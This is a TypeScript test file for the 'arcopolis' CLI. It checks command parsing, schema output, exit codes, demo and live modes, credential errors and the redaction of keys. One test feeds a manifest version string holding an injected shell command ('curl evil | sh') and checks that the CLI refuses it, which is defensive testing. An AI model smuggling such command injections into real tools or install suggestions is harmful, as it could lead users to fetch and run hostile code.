import { readFileSync } from "node:fs";
import { afterEach, beforeEach, describe, expect, it } from "vitest";
import { COMMANDS } from "../src/cli/registry.js";
import { defineCommand, objectSchema, type CommandSpec } from "../src/cli/spec.js";
import { CLI_VERSION } from "../src/version.js";
import { fakeFetch, fakeKey, json, run, tempDir } from "./helpers.js";

const packageJson = JSON.parse(readFileSync(new URL("../package.json", import.meta.url), "utf8")) as { version: string };

/** Every command in the plan §4 table for Phase 1. */
const PLAN_COMMANDS = [
  "status",
  "doctor",
  "setup",
  "auth status",
  "auth import",
  "auth forget",
  "init",
  "schema",
  "version",
  "portal",
  "api ops",
  "api get",
  "agents list",
  "agents get",
  "agents posts",
  "agents memory",
  "agents mood",
  "agents relationships",
  "agents reputation",
  "agents signals",
  "agents thoughts",
  "agents topics",
  "posts list",
  "posts get",
  "posts replies",
  "trending",
  "search",
  "topics list",
  "topics timeline",
  "network graph",
  "network ideas",
  "network challenges",
  "visitor status",
  "visitor heartbeat",
  "visitor act",
  "visitor pending",
  "visitor journal",
  "visitor standing",
  "exec",
  "env write",
  "env status",
  "mcp",
];

let dir: string;
let cleanup: () => Promise<void>;
beforeEach(async () => {
  ({ dir, cleanup } = await tempDir());
});
afterEach(async () => {
  await cleanup();
});

describe("runner basics", () => {
  it("CLI_VERSION matches package.json", () => {
    expect(CLI_VERSION).toBe(packageJson.version);
  });

  it("--version prints one JSON document", async () => {
    const result = await run(["--version"]);
    expect(result.exitCode).toBe(0);
    expect(result.json).toMatchObject({ ok: true, command: "version", exitCode: 0, data: { version: CLI_VERSION } });
  });

  it("--version in human mode prints the plain version", async () => {
    const result = await run(["--version", "--output", "human"]);
    expect(result.stdout).toBe(`arcopolis ${CLI_VERSION}\n`);
  });

  it("an unknown command exits 2 with one JSON error document", async () => {
    const result = await run(["bogus", "thing"]);
    expect(result.exitCode).toBe(2);
    expect(result.json).toMatchObject({ ok: false, exitCode: 2, error: { code: "UNKNOWN_COMMAND", category: "invalid_input" } });
    expect(result.stdout.trim().split("\n")).toHaveLength(1);
  });

  it("an unknown flag exits 2", async () => {
    const result = await run(["schema", "--bogus"]);
    expect(result.exitCode).toBe(2);
    expect(result.json).toMatchObject({ command: "schema", error: { code: "UNKNOWN_FLAG", message: "Unknown flag --bogus." } });
  });

  it("a bad flag value or a missing positional exits 2", async () => {
    expect((await run(["agents", "list", "--per-page", "500"])).json).toMatchObject({ error: { code: "INVALID_FLAG_VALUE" } });
    expect((await run(["agents", "get"])).json).toMatchObject({ exitCode: 2, error: { code: "MISSING_ARGUMENT" } });
    expect((await run(["schema", "extra"])).json).toMatchObject({ exitCode: 2, error: { code: "USAGE_ERROR" } });
  });

  it("no arguments prints the command overview", async () => {
    const result = await run([]);
    expect(result.exitCode).toBe(0);
    expect(result.json).toMatchObject({ command: "help", data: { cli: "arcopolis" } });
  });

  it("human-mode errors go to stderr and leave stdout empty", async () => {
    const result = await run(["bogus", "--output", "human"]);
    expect(result.exitCode).toBe(2);
    expect(result.stdout).toBe("");
    expect(result.stderr).toMatch(/UNKNOWN_COMMAND/);
  });

  it("<command> --help --json prints that command's schema entry", async () => {
    const result = await run(["visitor", "act", "--help", "--json"]);
    expect(result.exitCode).toBe(0);
    const data = result.json?.data as Record<string, unknown>;
    expect(data.name).toBe("visitor act");
    expect(data.confirmation).toBe("execute");
    expect(data.flags).toEqual(expect.arrayContaining([expect.objectContaining({ name: "--execute", humanDecision: true })]));
  });
});

describe("schema --json", () => {
  it("describes every plan command with effects, exit codes, and an outputSchema", async () => {
    const result = await run(["schema", "--json"]);
    expect(result.exitCode).toBe(0);
    const doc = result.json?.data as {
      schemaVersion: number;
      cli: string;
      version: string;
      exitCodes: Record<string, string>;
      exitCodeTable: unknown[];
      env: Array<{ name: string; secret: boolean }>;
      files: Array<{ path: string; mode: string; secret: boolean }>;
      globalFlags: Array<{ name: string }>;
      commands: Array<Record<string, unknown>>;
    };
    expect(doc).toMatchObject({ schemaVersion: 1, cli: "arcopolis", version: CLI_VERSION });
    expect(Object.keys(doc.exitCodes)).toHaveLength(14);
    expect(doc.exitCodes["9"]).toBe("unresolved_write");
    expect(doc.exitCodes["10"]).toBe("needs_human");
    expect(doc.exitCodeTable).toHaveLength(14);
    expect(doc.env).toEqual(expect.arrayContaining([{ name: "ARCOPOLIS_API_KEY", secret: true, description: expect.any(String) }]));
    expect(doc.files).toEqual(
      expect.arrayContaining([expect.objectContaining({ path: "~/.config/arcopolis/credentials.json", mode: "0600", secret: true })]),
    );
    expect(doc.globalFlags.map((flag) => flag.name)).toEqual(
      expect.arrayContaining(["--json", "--output", "--profile", "--no-input", "--verbose", "--quiet", "--timeout", "--demo", "--help", "--version"]),
    );
    const names = doc.commands.map((entry) => entry.name);
    expect(names).toEqual(expect.arrayContaining(PLAN_COMMANDS));
    for (const entry of doc.commands) {
      expect(entry.summary, String(entry.name)).toEqual(expect.any(String));
      expect(entry.effects).toEqual({ writes: expect.any(Array), spends: expect.any(Array) });
      expect((entry.exitCodes as number[]).includes(0), String(entry.name)).toBe(true);
      expect(typeof entry.outputSchema).toBe("object");
      for (const flag of entry.flags as Array<{ name: string; description: string }>) {
        expect(flag.name.startsWith("--"), `${String(entry.name)} ${flag.name}`).toBe(true);
        expect(flag.description.length).toBeGreaterThan(0);
      }
    }
  });

  it("--command narrows to one entry; an unknown name exits 2", async () => {
    const one = await run(["schema", "--command", "visitor act"]);
    expect((one.json?.data as { commands: unknown[] }).commands).toHaveLength(1);
    expect((await run(["schema", "--command", "nope"])).json).toMatchObject({ exitCode: 2, error: { code: "UNKNOWN_COMMAND" } });
  });

  it("the registry has unique names", () => {
    expect(new Set(COMMANDS.map((spec) => spec.name)).size).toBe(COMMANDS.length);
  });
});

describe("context and transport wiring", () => {
  const probe = (body: (ctx: Parameters<CommandSpec["run"]>[0]) => Promise<unknown>): CommandSpec =>
    defineCommand({
      name: "probe",
      summary: "test",
      phase: 1,
      credentials: "read",
      confirmation: "none",
      network: "data",
      effects: { writes: [], spends: [] },
      flags: [],
      positionals: [],
      errors: [],
      exitCodes: [0],
      outputSchema: objectSchema(),
      async run(ctx) {
        return { data: await body(ctx) };
      },
    });

  it("demo mode serves fixtures, records no effects, and marks meta.demo", async () => {
    const spec = probe(async (ctx) => (await (await ctx.createDataClient("read")).client.get("/trending")).data);
    const result = await run(["probe", "--demo"], { commands: [spec], env: { ARCOPOLIS_CONFIG_DIR: dir } });
    expect(result.exitCode).toBe(0);
    expect(result.json).toMatchObject({ meta: { demo: true }, effects: { requests: 0, network: [] } });
    expect((result.json?.data as Record<string, unknown>).hotThreads).toBeDefined();
  });

  it("live mode sends the env key with the CLI User-Agent and records effects", async () => {
    const fake = fakeFetch(() => json(200, { data: { ok: true } }));
    const spec = probe(async (ctx) => (await (await ctx.createDataClient("read")).client.get("/v1/trending")).data);
    const result = await run(["probe"], {
      commands: [spec],
      env: { ARCOPOLIS_CONFIG_DIR: dir, ARCOPOLIS_API_KEY: fakeKey("9") },
      fetchImpl: fake.fetchImpl,
    });
    expect(result.exitCode).toBe(0);
    expect(fake.calls[0]?.url).toBe("https://api.arcopolis.ai/v1/trending");
    expect(fake.calls[0]?.headers["user-agent"]?.startsWith(`arcopolis-cli/${CLI_VERSION} node/`)).toBe(true);
    expect(result.json).toMatchObject({ effects: { network: ["data"], requests: 1, spends: { rateLimit: 1 } } });
    expect(result.stdout).not.toContain(fakeKey("9"));
  });

  it("missing credentials exit 3 NO_CREDENTIALS with setup as next", async () => {
    const fake = fakeFetch(() => json(200, { data: {} }));
    const spec = probe(async (ctx) => ctx.createDataClient("read"));
    const result = await run(["probe"], { commands: [spec], env: { ARCOPOLIS_CONFIG_DIR: dir }, fetchImpl: fake.fetchImpl });
    expect(result.exitCode).toBe(3);
    expect(result.json).toMatchObject({ error: { code: "NO_CREDENTIALS" }, next: [{ command: "arcopolis setup --json" }] });
    expect(fake.calls).toHaveLength(0);
  });

  it("an unexpected exception exits 1 internal with no stack on stdout", async () => {
    const spec = probe(async () => {
      throw new TypeError("boom at secret place");
    });
    const result = await run(["probe"], { commands: [spec] });
    expect(result.exitCode).toBe(1);
    expect(result.json).toMatchObject({ error: { code: "INTERNAL", category: "internal" } });
    expect(result.stdout).not.toMatch(/at .*\.ts/);
    expect(result.stdout).not.toContain("boom");
  });

  it("output is redacted even when a command returns a key", async () => {
    const spec = probe(async () => ({ leaked: fakeKey("8") }));
    const result = await run(["probe"], { commands: [spec] });
    expect(result.stdout).not.toContain(fakeKey("8"));
    expect(result.json).toMatchObject({ data: { leaked: "agnts_8888…" } });
  });

  it("version --check refuses a manifest version that is not a plain x.y.z", async () => {
    // `latest` is interpolated into a suggested install command in next[].
    const fetchImpl = async (): Promise<Response> =>
      new Response(JSON.stringify({ latest: "9.9.9; curl evil | sh" }), { status: 200, headers: { "content-type": "application/json" } });
    const result = await run(["version", "--check"], { fetchImpl });
    expect(result.json).toMatchObject({ ok: false, error: { code: "INVALID_RESPONSE" } });
    expect(result.stdout).not.toContain("curl evil");
  });

  it("version --check in demo mode reads the fixture manifest", async () => {
    const result = await run(["version", "--check", "--demo"]);
    expect(result.json).toMatchObject({ data: { latest: expect.any(String), updateAvailable: false } });
  });
});
